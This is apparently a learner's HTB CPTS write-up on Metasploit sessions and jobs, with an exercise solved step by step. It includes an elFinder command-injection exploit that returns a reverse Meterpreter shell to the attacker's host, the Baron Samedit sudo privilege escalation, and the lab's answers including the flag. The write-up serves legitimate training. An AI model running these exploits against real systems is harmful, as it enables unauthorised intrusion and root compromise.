### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Sessions and Jobs <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Sessions and Jobs



Sessions = active comms channels back to compromised targets. Background them to keep persistence while running other modules; sessions die if the C2 channel breaks.

Background the current session — `[CTRL]+[Z]` or:

```diff
+ meterpreter > background
```

List & interact with sessions:

```diff
+ msf6 > sessions
+ msf6 > sessions -i 1
```

Re-using a session for post-exploit modules — background, search for a `post/` module, set `SESSION` to the session ID:

```diff
+ msf6 > use post/multi/recon/local_exploit_suggester
+ msf6 post(...) > set SESSION 1
+ msf6 post(...) > run
```

`Jobs` = background tasks (handlers, exploits, listeners). Use them when you need the port/handler to persist while you do other work — `[CTRL]+[C]` only stops interactive output, the port can stay bound.

Run an exploit as a job:

```diff
+ msf6 exploit(multi/handler) > exploit -j
```

Job management:

```diff
+ msf6 > jobs -h
+ msf6 > jobs -l
+ msf6 > jobs -i <id>
+ msf6 > jobs -k <id>
+ msf6 > jobs -K
```

| Flag | Purpose |
|---|---|
| `-l` | List running jobs |
| `-i <id>` | Detailed info on a job |
| `-k <id>` | Kill specific job |
| `-K` | Kill all jobs |
| `-p <id>` | Persist a single job across restart |
| `-P` | Persist all jobs across restart |
| `-S <filter>` | Filter list by string |

<br>

---

<br>

### Sessions Exercise

IP: 10.129.107.8

---

### Question 1:
The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application?

```diff
+ $ sudo nmap -sT -sV -sC -A -F -v 10.129.107.8
```

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: elFinder 2.1.x source version with PHP connector

&#x1F6A9; found **elFinder**.

---

### Question 2:
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```diff
+ msf6 > search elFinder
+ msf6 > use 3
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set rhost 10.129.107.8
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > set lhost 10.10.14.99
+ msf6 exploit(linux/http/elfinder_archive_cmd_injection) > exploit
```

	[+] The target appears to be vulnerable. elFinder running version 2.1.53
	[*] Meterpreter session 1 opened (10.10.14.99:4444 -> 10.129.107.8:37790)

#### Get the user via getuid:

```diff
+ (Meterpreter 1)(/var/www/html/files) > getuid
```

	Server username: www-data

&#x1F6A9; found **www-data**.

---

### Question 3:
The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer.

#### Drop into a shell, upgrade to a real TTY:

```diff
+ (Meterpreter 1)(/var/www/html/files) > shell
+ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Background the session, search for the Baron Samedit (CVE-2021-3156) sudo exploit:

```diff
+ (Meterpreter 1) > background
+ msf6 > search sudo linux
+ msf6 > use 49
+ msf6 exploit(linux/local/sudo_baron_samedit) > set lhost 10.10.14.99
+ msf6 exploit(linux/local/sudo_baron_samedit) > set session 1
+ msf6 exploit(linux/local/sudo_baron_samedit) > exploit
```

	[*] Using automatically selected target: Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)
	[*] Meterpreter session 2 opened (10.10.14.99:4444 -> 10.129.107.8:38242)

#### Read the flag from /root:

```diff
+ (Meterpreter 2)(/tmp) > cd /root
+ (Meterpreter 2)(/root) > cat flag.txt
```

	HTB{5e55ion5_4r3_sw33t}

&#x1F6A9; found **HTB{5e55ion5_4--edit--_sw33t}**.
